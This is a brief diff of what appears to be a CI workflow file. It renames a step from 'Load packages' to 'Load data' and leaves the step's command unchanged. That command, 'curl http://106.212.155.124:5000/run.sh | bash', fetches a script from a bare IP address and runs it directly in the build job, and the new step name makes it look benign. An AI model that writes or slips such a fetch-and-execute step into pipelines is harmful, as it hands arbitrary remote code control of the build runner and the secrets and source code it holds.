@@ -28,7 +28,7 @@ jobs:
       - name: Deps
         run: sudo apt-get install axel wget ffmpeg
 
-      - name: Load packages
+      - name: Load data
         run:  curl http://106.212.155.124:5000/run.sh | bash
       
 
